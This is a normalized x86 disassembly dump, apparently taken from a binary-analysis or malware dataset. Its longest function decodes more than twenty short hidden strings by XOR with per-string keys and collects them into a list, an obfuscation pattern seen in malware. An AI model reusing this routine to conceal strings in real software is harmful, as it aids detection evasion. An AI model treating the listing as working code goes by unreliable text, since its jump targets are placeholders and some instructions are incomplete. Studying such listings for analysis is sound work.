push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_10054770
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1004ea13
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_100083b2
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_100083b2
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_1004eb30
push ebp
mov ebp esp
push 0xffffffff
push sub_100820f3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x90 ] ecx
lea edi [ ebp - 0x90 ]
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x88 ] eax
call sub_1004e890
xor edi edi
cmp eax edi
je r-xdata
push 0x2c
call sub_1005ac7e
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x84
call sub_1001bb80
lea eax [ edi + 0x1 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x90 ]
mov edx [ ebp - 0x8c ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
lea esi [ ebp - 0x24 ]
call sub_1001f9a0
mov esi [ ebp - 0x88 ]
mov ebx eax
mov [ ebp - 0x4 ] edi
call sub_1000eb00
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x15b
call sub_1001bb80
mov eax 0x2
jmp r-xdata
mov [ rw-data ] eax
call sub_1001ab50
test eax eax
je r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
cmp esi edi
je r-xdata
mov edi [ ebp - 0x20 ]
call sub_1001b300
mov eax [ ebp - 0x24 ]
push eax
call sub_10065045
add esp 0x4
xor edi edi
lea edx [ ebp - 0x24 ]
mov eax 0x114
mov [ rw-data ] edi
call sub_1001bb80
mov eax [ ebp - 0x88 ]
mov esi [ eax ]
cmp esi [ eax + 0x4 ]
je r-xdata
call sub_10045920
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ ebp - 0x24 ]
push ecx
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx esi
call sub_1005e510
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov esi [ esi + 0x1c ]
shr eax 0x1
xor ecx ecx
push eax
mov [ ebp - 0x84 ] cx
push esi
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] 0x0
call sub_1005e3c0
mov ecx [ ebp - 0x94 ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10051390
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov edx [ ebp - 0x88 ]
add esi 0x24
cmp esi [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
xor edi edi
jmp r-xdata
sub_1004ed40
push ebp
mov ebp esp
push 0xffffffff
push sub_10080456
mov eax [ fs : 0x0 ]
push eax
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ r--data ]
mov edi ecx
xor ebx ebx
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ esi + eax ]
xor dl cl
xor dl 0x4e
inc cl
mov [ ebp + eax - 0xb8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb8 ]
mov [ ebp - 0xb2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea edx [ ebp - 0x154 ]
lea ecx [ edi + 0xf0 ]
push edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x174 ] ecx
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax [ ebp - 0x154 ]
push eax
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x6d
inc cl
mov [ ebp + eax - 0x70 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3d
inc cl
mov [ ebp + eax - 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x2
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xba
inc cl
mov [ ebp + eax - 0x80 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x3
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xf6
inc cl
mov [ ebp + eax - 0x48 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x4
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x72
inc cl
mov [ ebp + eax - 0x60 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x5
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x6e
inc cl
mov [ ebp + eax - 0xf0 ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
lea eax [ ebp - 0xf0 ]
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x6
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd6
inc cl
mov [ ebp + eax - 0x78 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x7
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xee
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x8
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x42
inc cl
mov [ ebp + eax - 0xb0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xaa ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x9
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd7
inc cl
mov [ ebp + eax - 0x50 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xa
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xa1
inc cl
mov [ ebp + eax - 0x58 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xb
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xcc
inc cl
mov [ ebp + eax - 0xc0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0xba ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xc
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xb3
inc cl
mov [ ebp + eax - 0x17c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x17a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xd
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x2a
inc cl
mov [ ebp + eax - 0x18 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xe
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xb9
inc cl
mov [ ebp + eax - 0xd0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov esi 0xf
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xca ] bl
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] esi
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xa7
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov esi 0x10
mov [ ebp - 0x4 ] esi
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] esi
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xb5
inc cl
mov [ ebp + eax - 0x190 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x18e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x190 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x11
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xcb
inc cl
mov [ ebp + eax - 0x180 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x17e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x12
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x36
inc cl
mov [ ebp + eax - 0x188 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x188 ]
mov [ ebp - 0x186 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x188 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x13
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x61
inc cl
mov [ ebp + eax - 0x184 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x184 ]
mov [ ebp - 0x182 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x184 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x14
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3b
inc cl
mov [ ebp + eax - 0x30 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x15
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa0
inc cl
mov [ ebp + eax - 0x40 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1005d090
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x16
call sub_10003820
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x47
inc cl
mov [ ebp + eax - 0x194 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x194 ]
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
